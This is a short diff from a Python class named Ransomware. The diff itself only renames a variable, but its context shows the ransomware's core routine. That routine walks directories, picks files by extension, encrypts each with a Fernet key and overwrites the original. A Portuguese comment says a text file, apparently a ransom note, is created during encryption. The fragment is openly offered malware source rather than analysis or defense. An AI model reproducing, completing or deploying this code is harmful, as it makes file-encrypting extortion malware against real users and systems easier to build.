@@ -48,15 +48,15 @@ class Ransomware:
                 if pathlib.Path(file).suffix in file_extensions:
                     file_abs_full_path = os.path.join(current_path, file)
 
-                    with open(file_abs_full_path, 'rb') as file_in_abs_path:
-                        file_data = file_in_abs_path.read()
+                    with open(file_abs_full_path, 'rb') as file_bytes:
+                        file_data = file_bytes.read()
                         if action == "encrypt":
                             final_data = Fernet(key).encrypt(file_data)
                         elif action == "decrypt":
                             final_data = Fernet(key).decrypt(file_data)
 
-                    with open(file_abs_full_path, 'wb') as file_in_abs_path:
-                        file_in_abs_path.write(final_data)
+                    with open(file_abs_full_path, 'wb') as file_bytes:
+                        file_bytes.write(final_data)
 
          # Criar o txt caso esteja criptografando
         if action == "encrypt":
